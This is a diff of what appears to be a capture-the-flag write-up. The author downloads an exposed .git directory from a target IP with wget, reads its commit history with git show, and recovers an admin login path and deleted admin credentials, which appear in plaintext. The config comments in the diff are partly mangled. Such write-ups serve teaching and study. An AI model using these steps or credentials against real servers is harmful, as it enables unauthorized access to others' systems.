@@ -5,7 +5,7 @@ I have check the site and They asked me about username and password and by guess
 and worked. check Tamp3rat0r.py
 # 2-Hold Up
 i test it with DWP and i found /.git path working and i download the directory
-wget --recursive --no-parent http://172.105.76.128/.git/
+root@cloudshell:~$ wget --recursive --no-parent http://172.105.76.128/.git/
 root@cloudshell:~$ ls
 172.105.76.128  
 root@cloudshell:~$ cd 172.105.76.128/
@@ -49,10 +49,10 @@ index 3d7f801..706d93b 100644
 - */
 -'overwritewebroot' => '',
 -
--/**
-  * Override condition
-  * This option allows you to define a manual override condition as a regular
-  * expression for the remote IP address. The keys `overwritewebroot`,
+-/
+   Override condition
+   This option allows you to define a manual override condition as a regular
+   expression for the remote IP address. The keys `overwritewebroot`,
 // this show us the path of admin log in is /S3cR3tPaTh/
 root@cloudshell:~/172.105.76.128/.git$git show 5b9e491
 commit 5b9e491802d53d6af1ef25206ccb0765b64a248b
@@ -79,18 +79,11 @@ index 46ed4f3..72e9842 100644
 
 
 -
--/**
--* Admin Credentials
--**/
--
+- Admin Credentials
 -
 -'Admin_Login' => 'Administrator'
 -'Admin_Password' => 'FN3ym@bZNaF&'
--
-+/** Delete Admin creds. **/
 
-
- /**
 /////////////////////////////////////////////////////////////////
 admin = Administrator
 password = FN3ym@bZNaF&
